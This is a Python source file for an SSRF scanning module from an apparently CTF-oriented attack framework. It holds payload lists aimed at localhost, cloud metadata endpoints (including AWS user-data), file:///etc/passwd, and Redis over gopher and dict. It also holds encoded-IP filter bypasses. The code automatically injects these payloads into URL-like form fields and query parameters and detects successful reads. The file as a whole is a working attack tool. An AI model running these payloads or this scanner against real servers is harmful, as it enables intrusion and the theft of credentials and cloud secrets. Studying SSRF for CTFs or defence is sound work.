"""
SSRF Module — Server-Side Request Forgery
Common in CTF challenges with URL fetch, webhook, or import features
"""
from backend.core.base_module import BaseModule
from backend.core.parser import Parser
from backend.core.flag_hunter import FlagHunter


class SSRFModule(BaseModule):
    MODULE_NAME = "ssrf"
    DESCRIPTION = "Server-Side Request Forgery"

    INTERNAL_TARGETS = [
        "http://localhost/",
        "http://127.0.0.1/",
        "http://0.0.0.0/",
        "http://[::1]/",
        "http://localhost:8080/",
        "http://127.0.0.1:8080/",
        "http://localhost:3000/",
        "http://169.254.169.254/",                          # AWS metadata
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://metadata.google.internal/",                 # GCP
        "http://169.254.169.254/metadata/v1/",             # DigitalOcean
        "http://localhost/flag",
        "http://127.0.0.1/flag.txt",
        "http://localhost/admin",
        "http://127.0.0.1/admin",
        "http://localhost/api/flag",
        "file:///etc/passwd",
        "file:///flag.txt",
        "file:///flag",
        "dict://localhost:6379/info",                       # Redis
        "gopher://localhost:6379/_INFO%0D%0A",
    ]

    BYPASS_PAYLOADS = [
        "http://2130706433/",           # 127.0.0.1 decimal
        "http://0177.0.0.1/",           # 127.0.0.1 octal
        "http://0x7f000001/",           # 127.0.0.1 hex
        "http://127.1/",
        "http://127.0.1/",
        "http://①②⑦.⓪.⓪.①/",          # Unicode
        "https://127.0.0.1.nip.io/",
    ]

    def run(self) -> dict:
        self.log(f"[SSRF] Starting scan on {self.target_url}")
        resp = self.requester.get()
        if resp is None:
            self.results["status"] = "unreachable"
            return self.results

        flags = FlagHunter.hunt(resp.text)
        [self.add_flag(f) for f in flags]

        forms  = Parser.extract_forms(resp.text)
        params = self._find_url_params(resp.text)

        self.log(f"[SSRF] Found {len(forms)} form(s), {len(params)} URL param(s)")

        for form in forms:
            self._test_form(form)

        self._test_url_params()

        if self.results["status"] == "pending":
            self.results["status"] = "not_vulnerable"
        return self.results

    def _find_url_params(self, html):
        """Find parameters that look like they accept URLs."""
        import re
        return re.findall(r'name=["\']?(url|link|src|href|target|redirect|'
                          r'next|path|resource|fetch|load|image|uri)["\']?',
                          html, re.IGNORECASE)

    def _test_form(self, form):
        action = form["action"] or self.target_url
        if not action.startswith("http"):
            action = self.target_url.rstrip("/") + "/" + action.lstrip("/")

        url_fields = [i for i in form["inputs"]
                      if any(kw in (i["name"] or "").lower()
                             for kw in ("url", "link", "src", "href",
                                        "target", "redirect", "fetch",
                                        "load", "uri", "resource"))]

        for field in url_fields:
            for payload in self.INTERNAL_TARGETS[:12]:
                data = {i["name"]: (payload if i["name"] == field["name"]
                                    else i["value"] or "test")
                        for i in form["inputs"] if i["name"]}
                r = (self.requester.post(action, data=data)
                     if form["method"] == "POST"
                     else self.requester.get(action, params=data))
                if r is None:
                    continue
                if any(sig in r.text for sig in
                       ["root:x:", "ami-id", "instance-id",
                        "flag{", "FLAG{", "metadata", "127.0.0.1"]):
                    self.add_vuln({"type": "ssrf", "field": field["name"],
                                   "payload": payload})
                    flags = FlagHunter.hunt(r.text)
                    [self.add_flag(f) for f in flags]
                    self.log(f"[SSRF] Vulnerable field: {field['name']}")

    def _test_url_params(self):
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)
        ssrf_params = {k: v for k, v in params.items()
                       if any(kw in k.lower() for kw in
                              ("url", "link", "src", "href", "redirect",
                               "fetch", "load", "uri", "resource", "next"))}
        for param in ssrf_params:
            for payload in self.INTERNAL_TARGETS[:8]:
                test = {**params, param: payload}
                url  = urlunparse(parsed._replace(
                    query=urlencode(test, doseq=True)))
                r = self.requester.raw_get(url)
                if r and any(sig in r.text for sig in
                             ["root:x:", "ami-id", "flag{", "FLAG{"]):
                    self.add_vuln({"type": "ssrf_url_param",
                                   "param": param, "payload": payload})
                    flags = FlagHunter.hunt(r.text)
                    [self.add_flag(f) for f in flags]
